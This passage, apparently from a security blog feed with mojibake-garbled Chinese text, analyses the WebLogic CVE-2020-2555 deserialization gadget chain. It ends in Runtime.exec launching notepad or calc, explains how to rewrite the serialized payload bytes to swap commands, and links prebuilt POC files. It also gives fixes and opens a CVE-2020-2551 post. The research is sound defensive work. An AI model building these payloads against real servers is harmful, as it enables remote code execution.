alt=""></p><p>è·Ÿè¸ªè¿›å…¥ <code>aExtractor[i].extract(oTarget)</code>  ä¼šè·³å…¥ <code>com.tangosol.util.extractor.ReflectionExtractor#extract</code> ï¼Œæœ€åé€šè¿‡ <code>method.invoke</code> åå°„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å¼€å§‹æ‰§è¡Œ <code>java.lang.Runtime.getRuntime</code>ï¼Œæœ€åè®²æ‰§è¡Œçš„ç»“æœè¿›è¡Œ <code>return</code>ï¼Œç±»å‹ä¸º <code>java.lang.Runtime</code>ï¼Œæ‰€ä»¥æ•´ä¸ªæ–¹æ³•æ‰§è¡Œçš„ä»£ç ä¸º <code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]);</code></p><p><img src="https://img.zhiiyun.com/blog_5081b81f79e96197d8b0b491eae77ccc" alt=""></p><p>ç¬¬äºŒæ¬¡å°†<code>java.lang.Runtime.getRuntime</code> ï¼ˆä¹Ÿå°±æ˜¯ <code>java.lang.Runtime</code>ï¼‰ ä½œä¸º <code>oTarget</code> å‚æ•°å€¼è¿›è¡Œä¼ å…¥æ‰§è¡Œ<br>è¿›è¡Œå¾ªç¯ <code>method.invoke</code>ï¼Œåå°„æ‰§è¡Œ <code>invoke</code> ï¼Œæœ€ç»ˆæ‰§è¡Œä»£ç ä¸º<br><code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]).invoke(null, new Object[0])</code> ï¼Œæœ€åæ‰§è¡Œå®Œæ¯•ç»“æœä¸º <code>java.lang.Runtime</code> ç±»ï¼Œå¹¶ä¸”å°† <code>return</code> æä¾›ä¸‹æ¬¡è¿›è¡Œè°ƒç”¨æ‰§è¡Œã€‚</p><p><img src="https://img.zhiiyun.com/blog_3cb6d6f9e5463f4578f82b9dfbdf05d3" alt=""><br><img src="https://img.zhiiyun.com/blog_88ef785f8ba3ed1f08e1e3a15cf55d95" alt=""><br><img src="https://img.zhiiyun.com/blog_543303e6d4e05fa5d9326cfb0fcd1604" alt=""></p><p>æœ€åé€šè¿‡ <code>java.lang.Runtime.exec</code> è¿›è¡Œåå°„æ‰§è¡Œå‘½ä»¤ï¼Œæœ€ç»ˆæ‰§è¡Œçš„ä»£ç ä¸º <code>runtime.exec(new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;})</code> è¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ï¼Œå¼¹å‡ºè®°äº‹æœ¬ã€‚</p><p><img src="https://img.zhiiyun.com/blog_503b3c294714108a7f95717d1d17a44e" alt=""> </p><p><img src="https://img.zhiiyun.com/blog_8bea9e897bba8b002cf2409af5d28667" alt=""></p><p><img src="https://img.zhiiyun.com/blog_201846b512ca326fa649704c59c54825" alt=""></p><h3 id="weblogic-10-3-6"><a href="#weblogic-10-3-6" class="headerlink" title="weblogic 10.3.6"></a>weblogic 10.3.6</h3><p>weblogic 10.3.6 ç‰ˆæœ¬é»˜è®¤è‡ªå¸¦ coherence_3.7 ï¼Œä½†é€šè¿‡ Debug è°ƒè¯•å‘ç° weblogic 10.3.6 å¹¶æœªå¯ç”¨ coherence_3.7 æ‰€ä»¥æ— æ³•é’ˆå¯¹ weblogic 10.3.6  è¿›è¡Œæµ‹è¯•ï¼Œä½† coherence_3.7 ç‰ˆæœ¬ä¸­ <code>com.tangosol.util.filter.LimitFilter#toString</code> æ¼æ´ä»ç„¶å­˜åœ¨ï¼Œæ‰€ä»¥  coherence 3.7 ç‰ˆæœ¬å­˜åœ¨æ¼æ´ä½† weblogic 10.3.6 é»˜è®¤æƒ…å†µä¸‹ä¸å­˜åœ¨è¯¥æ¼æ´ã€‚</p><p><img src="https://img.zhiiyun.com/blog_ead5da4005a3589a5484bcd42338a0a3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_a1d57640e6d210dd3f3f76bca6c19a17" alt=""></p><h2 id="ä¸è¶³ä¹‹å¤„"><a href="#ä¸è¶³ä¹‹å¤„" class="headerlink" title="ä¸è¶³ä¹‹å¤„"></a>ä¸è¶³ä¹‹å¤„</h2><p>ç»è¿‡åˆ†æå‘ç° POC å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œå¯¼è‡´æ¼æ´æ£€æµ‹æ•ˆç‡å˜ä½ï¼ŒåŒæ—¶æ— æ³•è¿›è¡Œé€šè¿‡å…¶ä»–è¯­è¨€å¼€å‘è°ƒç”¨ã€‚</p><h3 id="åŠ¨æ€åºåˆ—åŒ–é—®é¢˜"><a href="#åŠ¨æ€åºåˆ—åŒ–é—®é¢˜" class="headerlink" title="åŠ¨æ€åºåˆ—åŒ–é—®é¢˜"></a>åŠ¨æ€åºåˆ—åŒ–é—®é¢˜</h3><p>å¦‚æœ POC ç”¨äºé java è¯­è¨€å¼€å‘çš„æ‰«ææ¡†æ¶æ—¶ï¼Œæ˜¯éå¸¸éº»çƒ¦çš„è¦ä¹ˆæ˜¯å°†ä»£ç é›†æˆ  <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> ç„¶åé€šè¿‡è¿›ç¨‹è°ƒç”¨çš„æ–¹å¼åŠ¨æ€ç”Ÿæˆåºåˆ—åŒ–æ–‡ä»¶ï¼Œä½†è¯¥æ–¹æ³•ä¼šä¸æ–­çš„é€šè¿‡è¿›ç¨‹è°ƒç”¨æ‰§è¡Œä»£ç ï¼Œä¼šé€ æˆå¾ˆå¤§çš„èµ„æºå¼€é”€ã€‚é™¤äº†ä½¿ç”¨è¿™ç§æ–¹æ³•ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡åŠ è½½ä»¥å‰çš„ POC è¿›è¡ŒäºŒè¿›åˆ¶è¯»å–å¹¶ä¸”æ›¿æ¢ä»£ç é‡æ–°ç”Ÿæˆåºåˆ—åŒ–æ–‡ä»¶ã€‚</p><p>é€šè¿‡ç ”ç©¶åˆ†æå‘ç°ï¼Œä¿®æ”¹å‚æ•°å†…å®¹æ—¶å˜åŠ¨çš„å†…å®¹ä¸»è¦ä¸º <code>13 5B 4C 6A 61 76 61 2E 6C 61 6E 67 2E 53 74 72 69 6E 67 3B AD D2 56 E7 E9 1D 7B 47 02 00 00 78 70 00 00 00 03 74 00</code> å­—èŠ‚è‡³ <code>00 04 65 78 65 63 70 70 76 72 00 11 6A 61 76 61 2E 6C 61 6E 67 2E 52 75 6E 74 69 6D 65 00 00 00 00 00 00 00 00 00 00 00 78 70</code> çš„å†…å®¹ä¿¡æ¯ï¼Œå…¶ä¸­å·¦å›¾çš„å‚æ•°ä¸º <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code>ï¼Œå³å›¾çš„å‚æ•°ä¸º <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_aaab4d9d707e33acd313e176c868bce6" alt=""></p><p>é€šè¿‡åˆ†æç›¸åŒ weblogic ç‰ˆæœ¬ä¸­é€šè¿‡ <code>coherence.jar</code> ç”Ÿæˆçš„ <code>payload</code>ï¼Œæ¯”å¯¹å…¶ä¸­å·®å¼‚å‘ç°å‚æ•°æ„é€ çš„æ–¹å¼ä¸ºï¼šæ¯ä¸ªå‚æ•°çš„é•¿åº¦è½¬æ¢ä¸º 16 è¿›åˆ¶ï¼Œå ç”¨ 2 ä¸ªå­—èŠ‚ï¼Œä¸è¶³ç”¨ <code>0</code> è¡¥è¶³ + æ¯ä¸ªå‚æ•°å€¼çš„ Hex  ç  + ( 70 weblogic  12.2.1.3.0 ç‰ˆæœ¬æœ€åä¸€ä½å‚æ•° ) +74 ï¼ˆä½œè€…ç†è§£ä¸ºæ ‡è¯†ç¬¦ï¼‰ï¼Œæ‰€ä»¥è½¬æ¢å¯¹åº”æƒ…å†µå¦‚ä¸‹ï¼š</p><p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code> ï¼ˆ weblogic 12.2.1.3.0ï¼Œéœ€è¦åŠ  70 å…¶ä»–ç‰ˆæœ¬ä¸éœ€è¦ï¼‰å¯¹åº”çš„è½¬æ¢æƒ…å†µä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 07 6E 6F 74 65 70 61 64  70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 07 = &quot;notepad&quot;.length()</span><br><span class="line">6E 6F 74 65 70 61 64 = &quot;notepad&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure><p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code> ï¼ˆ weblogic 12.2.1.3.0ï¼Œéœ€è¦åŠ  70 å…¶ä»–ç‰ˆæœ¬ä¸éœ€è¦ï¼‰å¯¹åº”çš„è½¬æ¢æƒ…å†µä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 04 63 61 6C 63 70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 04 = &quot;calc&quot;.length()</span><br><span class="line">63 61 6C 63  = &quot;calc&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure><p>äº†è§£äº†å‚æ•°å˜åŠ¨çš„è§„å¾‹ä»¥åŠå¯¹åº”çš„å­—èŠ‚ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŸºäºè¯¥æ–¹å¼è¿›è¡ŒåŠ¨æ€æ„å»ºåºåˆ—åŒ–æ–‡ä»¶ã€‚</p><p>æµ‹è¯•ä¸­ä½¿ç”¨çš„å„ä¸ªç‰ˆæœ¬ç”Ÿäº§ POC åºåˆ—åŒ–æ–‡ä»¶å­˜æ”¾åœ¨ <a href="https://github.com/0nise/CVE-2020-2555" target="_blank" rel="noopener">CVE-2020-2555</a> <code>file</code> ç›®å½•ä¸­ã€‚</p><table><thead><tr><th style="text-align:center">ç‰ˆæœ¬</th><th style="text-align:center">æ–‡ä»¶å</th><th style="text-align:center">æè¿°</th><th style="text-align:center">æ“ä½œç³»ç»Ÿ</th></tr></thead><tbody><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_calc.666" target="_blank" rel="noopener">121300_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_notepad.666" target="_blank" rel="noopener">121300_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_ping.666" target="_blank" rel="noopener">121300_ping.666</a></td><td style="text-align:center">ping</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300.666" target="_blank" rel="noopener">121300.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_calc.666" target="_blank" rel="noopener">122130_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_calc.666" target="_blank" rel="noopener">122130_linux_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_curl.666" target="_blank" rel="noopener">122130_linux_curl.666</a></td><td style="text-align:center">curl</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_notepad.666" target="_blank" rel="noopener">122130_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130.666" target="_blank" rel="noopener">122130.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_calc.666" target="_blank" rel="noopener">122140_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_calc.666" target="_blank" rel="noopener">122140_linux_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_curl.666" target="_blank" rel="noopener">122140_linux_curl.666</a></td><td style="text-align:center">curl</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_notepad.666" target="_blank" rel="noopener">122140_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140.666" target="_blank" rel="noopener">122140.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr></tbody></table><h3 id="Coherence-ç‰ˆæœ¬é—®é¢˜"><a href="#Coherence-ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="Coherence ç‰ˆæœ¬é—®é¢˜"></a>Coherence ç‰ˆæœ¬é—®é¢˜</h3><p>åœ¨ç ”ç©¶æµ‹è¯•æ—¶ï¼Œé€šè¿‡æŸä¸€ä¸ª Coherence ç‰ˆæœ¬ç”Ÿæˆçš„åºåˆ—åŒ–æ–‡ä»¶ï¼Œæ— æ³•é€‚ç”¨äºå¤šä¸ªç‰ˆæœ¬ï¼Œä»¥ä¸‹ä¸ºå¤šç‰ˆæœ¬çš„è¯¦ç»†æµ‹è¯•æƒ…å†µï¼š</p><table><thead><tr><th style="text-align:center">poc ç”Ÿæˆç‰ˆæœ¬</th><th style="text-align:center">æµ‹è¯•ç‰ˆæœ¬</th><th style="text-align:center">æ˜¯å¦æˆåŠŸ</th></tr></thead><tbody><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">æ˜¯</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">æ˜¯</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">æ˜¯</td></tr></tbody></table><p>å¯ä»¥å‘ç°ä¸€ä¸ª POC æ— æ³•é€‚ç”¨äºå¤šç‰ˆæœ¬çš„ weblogic ä¸­ï¼Œé’ˆå¯¹è¯¥æƒ…å†µå¯ä»¥åŸºäº weblogic åºåˆ—åŒ–æ–‡ä»¶è½¬æ¢ä¸ºå­—èŠ‚ç ç»“åˆåŠ¨æ€åºåˆ—åŒ–æŠ€æœ¯å¤„ç†ï¼Œæ¥è¾¾åˆ°å…¼å®¹å¤šä¸ªç‰ˆæœ¬çš„ç›®çš„ã€‚</p><h2 id="Weblogic-çš„é—®é¢˜"><a href="#Weblogic-çš„é—®é¢˜" class="headerlink" title="Weblogic çš„é—®é¢˜"></a>Weblogic çš„é—®é¢˜</h2><p><strong> æˆªæ­¢ 2020 å¹´ 3 æœˆ 4 æ—¥ï¼Œé€šè¿‡ Oracle å®˜æ–¹è¿›è¡Œä¸‹è½½ weblogic æ—¶ï¼Œé€šè¿‡ç ”ç©¶å‘ç°è¯¥æ¼æ´ä¾ç„¶å­˜åœ¨å¯ä»¥åˆ©ç”¨ï¼ˆæ‰€æœ‰å—å½±å“ç‰ˆæœ¬ï¼‰ï¼Œéœ€è¦é¢å¤–å®‰è£…è¡¥ä¸ã€‚</strong></p><p>å¦‚ä¸‹æ–‡ä»¶ä¸ºä¸‹æ–‡ä»¶MD5å€¼ä»¥åŠä¸‹è½½æ—¶é—´ï¼š</p><table><thead><tr><th style="text-align:center">æ–‡ä»¶åç§°</th><th style="text-align:center">MD5</th><th style="text-align:center">åˆ›å»ºæ—¶é—´</th></tr></thead><tbody><tr><td style="text-align:center">fmw_12.1.3.0.0_wls.jar</td><td style="text-align:center">8378FE936B476A6F4CA5EFA465A435E3</td><td style="text-align:center">â€2020â€-03â€-04â€</td></tr><tr><td style="text-align:center">fmw_12.2.1.3.0_wls.jar</td><td style="text-align:center">6E7105521029058AD64A5C6198DB09F7</td><td style="text-align:center">â€2017-08â€-21â€</td></tr><tr><td style="text-align:center">fmw_12.2.1.4.0_wls.jar</td><td style="text-align:center">AA090712069684991BA27E4DE9ED3FF6</td><td style="text-align:center">â€2019-09â€-13â€</td></tr><tr><td style="text-align:center">coherence.jar(12.1.3.0.0)</td><td style="text-align:center">E807E84D352374E33D0E2A8CC649534A</td><td style="text-align:center">2014-05-14</td></tr><tr><td style="text-align:center">coherence.jar(12.2.1.3.0)</td><td style="text-align:center">2302E408BCA7C6A82081A20CE0811B0E</td><td style="text-align:center">2017-08-15</td></tr><tr><td style="text-align:center">coherence.jar(12.2.1.4.0)</td><td style="text-align:center">B28EE46B9B9BD5C24DF3BFEE10075BA4</td><td style="text-align:center">2019-09-12</td></tr></tbody></table><p>å»ºè®®ç›®å‰å·²ç»å®‰è£…æœ€æ–°ç‰ˆ weblogic çš„ç®¡ç†å‘˜ä¹Ÿéœ€æ’æŸ¥è¯¥æ¼æ´ï¼Œå¦‚æœ‰æ¼æ´å»ºè®®ç«‹å³å®‰è£…è¡¥ä¸æˆ–é€šè¿‡ä¿®å¤æ–¹æ¡ˆè¿›è¡Œä¿®å¤ï¼Œé˜²æ­¢è¢«ä¸æ³•åˆ†å­åˆ©ç”¨ã€‚</p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><ol><li>ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼šç¦ç”¨ weblogic T3 åè®®ã€‚</li><li>å®‰è£… <a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">Oracle æ›´æ–°è¡¥ä¸</a>ï¼Œéœ€è¦ç™»å½•å¸æˆ·åä¸‹è½½ã€‚</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://nosec.org/home/detail/4205.html" target="_blank" rel="noopener">CVE-2020-2555ï¼šWebLogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a></li><li><a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLEâ€™S WEBLOGIC SERVER</a></li><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;åœ¨2020å¹´1æœˆï¼Œäº’è”ç½‘ä¸Šçˆ†å‡ºäº†Weblogicååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-2555ï¼‰ï¼ŒOracle Fusionä¸­é—´ä»¶ O
      
    
    </summary>
    
      <category term="æ¼æ´ç ”ç©¶" scheme="http://www.r4v3zn.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="weblogic" scheme="http://www.r4v3zn.com/tags/weblogic/"/>
    
      <category term="t3" scheme="http://www.r4v3zn.com/tags/t3/"/>
    
      <category term="cve" scheme="http://www.r4v3zn.com/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>æ¼«è°ˆ WebLogic CVE-2020-2551</title>
    <link href="http://www.r4v3zn.com/posts/b64d9185/"/>
    <id>http://www.r4v3zn.com/posts/b64d9185/</id>
    <published>2020-03-04T10:06:44.000Z</published>
    <updated>2020-11-11T08:06:56.436Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>2020 å¹´ 1æœˆ14æ—¥ï¼ŒOracle å‘å¸ƒäº†å¤§é‡å®‰å…¨è¡¥ä¸ï¼Œä¿®å¤äº† 43 ä¸ªä¸¥é‡æ¼æ´ï¼ŒCVSS è¯„åˆ†å‡åœ¨åœ¨9.1ä»¥ä¸Šã€‚<br>å…¶ä¸­ CVE-2020-2551 æ¼æ´ï¼Œäº’è”ç½‘ä¸­å…¬å¸ƒäº†å‡ ç¯‡é’ˆå¯¹è¯¥æ¼æ´çš„åˆ†ææ–‡ç« ä»¥åŠPOCï¼Œä½†å…¬å¸ƒçš„ POC æœ‰éƒ¨åˆ†ä¸è¶³ä¹‹å¤„ï¼Œå¯¼è‡´æ¼æ´æ£€æµ‹æ•ˆç‡å˜ä½ï¼Œä¸è¶³ä¹‹å¤„ä¸»è¦ä½“ç°åœ¨ï¼š</p><ol><li><strong>å…¬å¸ƒçš„ POC ä»£ç åªé’ˆå¯¹ç›´è¿ï¼ˆå†…ç½‘ï¼‰ç½‘ç»œæœ‰æ•ˆï¼ŒDockerã€NAT ç½‘ç»œå…¨éƒ¨æ— æ•ˆã€‚</strong></li><li><strong>å…¬å¸ƒçš„ POC ä»£ç åªæ”¯æŒå•ç‹¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ— æ³•é€‚åº”å¤šä¸ª weblogic ç‰ˆæœ¬ã€‚</strong></li></ol><p><strong>æ³¨ï¼š</strong><br><strong> 1. ç»è¿‡å¤§é‡çš„æµ‹è¯•ï¼Œæˆ‘ä»¬çš„ POC å¯ç¨³å®šè¿è¡Œåœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿã€å¤šä¸ª weblogic ç‰ˆæœ¬ã€å¤šä¸ª JDK ç‰ˆæœ¬ä»¥åŠ Docker ç½‘ç»œä¸­ã€‚</strong><br><strong> 2.  ä»¥ä¸Šæµ‹è¯•åŠåˆ†æç¯å¢ƒå…¨éƒ¨åŸºäºå†…éƒ¨ç¯å¢ƒã€‚</strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é€šè¿‡ Oracle å®˜æ–¹å‘å¸ƒçš„å…¬å‘Šæ˜¯å¯ä»¥çœ‹å‡ºè¯¥æ¼æ´çš„ä¸»è¦æ˜¯åœ¨æ ¸å¿ƒç»„ä»¶ä¸­çš„ï¼Œå½±å“åè®®ä¸º IIOP ã€‚è¯¥æ¼æ´åŸç†ä¸Šç±»ä¼¼äºRMIååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-3241ï¼‰ï¼Œå’Œä¹‹å‰çš„T3åè®®æ‰€å¼•å‘çš„ä¸€ç³»åˆ—ååºåˆ—åŒ–æ¼æ´ä¹Ÿå¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ç”±äºè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„å®ç°å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´åºåˆ—åŒ–å¯¹è±¡å¯ä»¥ä»»æ„æ„é€ ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œå®‰å…¨æ£€æŸ¥æ‰€å¯¼è‡´çš„ã€‚</p><h2 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h2><p>ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„ç†è§£æœ¬æ–‡ç¨¿ä¸­æ‰€æè¿° RMIã€IIOPã€GIOPã€CORBA ç­‰åè®®åç§°ï¼Œä¸‹é¢æ¥è¿›è¡Œç®€å•ä»‹ç»ã€‚</p><h3 id="IDLä¸Java-IDL"><a href="#IDLä¸Java-IDL" class="headerlink" title="IDLä¸Java IDL"></a>IDLä¸Java IDL</h3><p>IDLå…¨ç§°ï¼ˆInterface Definition Languageï¼‰ä¹Ÿå°±æ˜¯æ¥å£å®šä¹‰è¯­è¨€ï¼Œå®ƒä¸»è¦ç”¨äºæè¿°è½¯ä»¶ç»„ä»¶çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£çš„ä¸€ç§è§„èŒƒè¯­è¨€ã€‚å®ƒå®Œæˆäº†ä¸å„ç§ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ–¹å¼æè¿°æ¥å£ï¼Œä»è€Œå®ç°äº†ä¸åŒè¯­è¨€ä¹‹é—´çš„é€šä¿¡ï¼Œè¿™æ ·å°±ä¿è¯äº†è·¨è¯­è¨€è·¨ç¯å¢ƒçš„è¿œç¨‹å¯¹è±¡è°ƒç”¨ã€‚</p><p>åœ¨åŸºäºIDLæ„å»ºçš„è½¯ä»¶ç³»ç»Ÿä¸­å°±å­˜åœ¨ä¸€ä¸ªOMG IDLï¼ˆå¯¹è±¡ç®¡ç†ç»„æ ‡å‡†åŒ–æ¥å£å®šä¹‰è¯­è¨€ï¼‰ï¼Œå…¶ç”¨äºCORBAä¸­ã€‚</p><p>å°±å¦‚ä¸Šæ–‡æ‰€è¯´ï¼ŒIDLæ˜¯ä¸ç¼–ç¨‹è¯­è¨€æ— å…³çš„ä¸€ç§è§„èŒƒåŒ–æè¿°æ€§è¯­è¨€ï¼Œä¸åŒçš„ç¼–ç¨‹è¯­è¨€ä¸ºäº†å°†å…¶è½¬åŒ–æˆIDLï¼Œéƒ½åˆ¶å®šäº†ä¸€å¥—è‡ªç”¨çš„ç¼–è¯‘å™¨ç”¨äºå°†å¯è¯»å–çš„OMG IDLæ–‡ä»¶è½¬æ¢æˆ–æ˜ å°„æˆç›¸åº”çš„æ¥å£æˆ–ç±»å‹ã€‚Java IDLå°±æ˜¯Javaå®ç°çš„è¿™å¥—ç¼–è¯‘å™¨ã€‚</p><h3 id="RMIã€JRMPã€JNDI"><a href="#RMIã€JRMPã€JNDI" class="headerlink" title="RMIã€JRMPã€JNDI"></a>RMIã€JRMPã€JNDI</h3><p>Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆJava Remote Method 